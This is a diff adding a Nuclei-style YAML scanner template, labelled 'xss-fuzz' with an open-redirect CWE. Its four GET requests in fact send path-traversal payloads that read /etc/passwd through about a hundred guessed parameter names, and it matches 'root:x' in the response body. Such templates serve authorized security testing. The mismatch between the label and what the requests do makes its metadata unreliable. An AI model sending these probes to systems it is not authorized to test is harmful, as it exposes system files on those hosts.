@@ -1,0 +1,47 @@
+id: xss-reflect-fuzzer-xandsz
+
+info:
+  name: xss-fuzz
+  author: xandsz
+  severity: medium
+  description: |
+    Verifica parametros ocultos que refletem dentro do HTML da pagina
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-601
+  metadata:
+    max-request: 2
+  tags: fuzzer, generic
+
+http:
+  - method: GET
+    path:
+
+      - "{{BaseURL}}/?file=../../../../../../../../../../etc/passwd&page=../../../../../../../../../../etc/passwd&include=../../../../../../../../../../etc/passwd&path=../../../../../../../../../../etc/passwd&dir=../../../../../../../../../../etc/passwd&template=../../../../../../../../../../etc/passwd&config=../../../../../../../../../../etc/passwd&view=../../../../../../../../../../etc/passwd&source=../../../../../../../../../../etc/passwd&content=../../../../../../../../../../etc/passwd&filename=../../../../../../../../../../etc/passwd&load=../../../../../../../../../../etc/passwd&load_file=../../../../../../../../../../etc/passwd&load_path=../../../../../../../../../../etc/passwd&load_template=../../../../../../../../../../etc/passwd&load_config=../../../../../../../../../../etc/passwd&load_view=../../../../../../../../../../etc/passwd&load_source=../../../../../../../../../../etc/passwd&load_content=../../../../../../../../../../etc/passwd&data=../../../../../../../../../../etc/passwd&document=../../../../../../../../../../etc/passwd&doc=../../../../../../../../../../etc/passwd&resource=../../../../../../../../../../etc/passwd&rsc=../../../../../../../../../../etc/passwd&style=../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?theme=../../../../../../../../../../etc/passwd&layout=../../../../../../../../../../etc/passwd&l=../../../../../../../../../../etc/passwd&f=../../../../../../../../../../etc/passwd&action=../../../../../../../../../../etc/passwd&target=../../../../../../../../../../etc/passwd&t=../../../../../../../../../../etc/passwd&tpl=../../../../../../../../../../etc/passwd&file_path=../../../../../../../../../../etc/passwd&file_dir=../../../../../../../../../../etc/passwd&v=../../../../../../../../../../etc/passwd&src=../../../../../../../../../../etc/passwd&cfg=../../../../../../../../../../etc/passwd&conf=../../../../../../../../../../etc/passwd&settings=../../../../../../../../../../etc/passwd&ini_file=../../../../../../../../../../etc/passwd&log_file=../../../../../../../../../../etc/passwd&logfile=../../../../../../../../../../etc/passwd&load_page=../../../../../../../../../../etc/passwd&load_include=../../../../../../../../../../etc/passwd&load_dir=../../../../../../../../../../etc/passwd&load_data=../../../../../../../../../../etc/passwd&load_document=../../../../../../../../../../etc/passwd&load_doc=../../../../../../../../../../etc/passwd&load_resource=../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?load_rsc=../../../../../../../../../../etc/passwd&load_style=../../../../../../../../../../etc/passwd&load_theme=../../../../../../../../../../etc/passwd&load_layout=../../../../../../../../../../etc/passwd&load_file_path=../../../../../../../../../../etc/passwd&load_file_dir=../../../../../../../../../../etc/passwd&inc=../../../../../../../../../../etc/passwd&inc_file=../../../../../../../../../../etc/passwd&inc_path=../../../../../../../../../../etc/passwd&inc_dir=../../../../../../../../../../etc/passwd&inc_template=../../../../../../../../../../etc/passwd&inc_config=../../../../../../../../../../etc/passwd&inc_view=../../../../../../../../../../etc/passwd&inc_source=../../../../../../../../../../etc/passwd&inc_content=../../../../../../../../../../etc/passwd&inc_data=../../../../../../../../../../etc/passwd&inc_document=../../../../../../../../../../etc/passwd&inc_doc=../../../../../../../../../../etc/passwd&inc_resource=../../../../../../../../../../etc/passwd&inc_rsc=../../../../../../../../../../etc/passwd&inc_style=../../../../../../../../../../etc/passwd&inc_theme=../../../../../../../../../../etc/passwd&inc_layout=../../../../../../../../../../etc/passwd&inc_file_path=../../../../../../../../../../etc/passwd&inc_file_dir=../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/?post=../../../../../../../../../../etc/passwd&pfile=../../../../../../../../../../etc/passwd&p_path=../../../../../../../../../../etc/passwd&p_dir=../../../../../../../../../../etc/passwd&p_template=../../../../../../../../../../etc/passwd&p_config=../../../../../../../../../../etc/passwd&p_view=../../../../../../../../../../etc/passwd&p_source=../../../../../../../../../../etc/passwd&p_content=../../../../../../../../../../etc/passwd&p_data=../../../../../../../../../../etc/passwd&p_document=../../../../../../../../../../etc/passwd&p_doc=../../../../../../../../../../etc/passwd&p_resource=../../../../../../../../../../etc/passwd&p_rsc=../../../../../../../../../../etc/passwd&p_style=../../../../../../../../../../etc/passwd&p_theme=../../../../../../../../../../etc/passwd&p_layout=../../../../../../../../../../etc/passwd&p_file_path=../../../../../../../../../../etc/passwd&p_file_dir=../../../../../../../../../../etc/passwd&log=../../../../../../../../../../etc/passwd&log_path=../../../../../../../../../../etc/passwd&log_dir=../../../../../../../../../../etc/passwd&logfile_path=../../../../../../../../../../etc/passwd&logfile_dir=../../../../../../../../../../etc/passwd&logfilepath=../../../../../../../../../../etc/passwd"
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:                    
+          - "root:x"
+
+          
+        condition: and
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+        condition: and
+
+      - type: status
+        status:
+          - 200
+          - 404
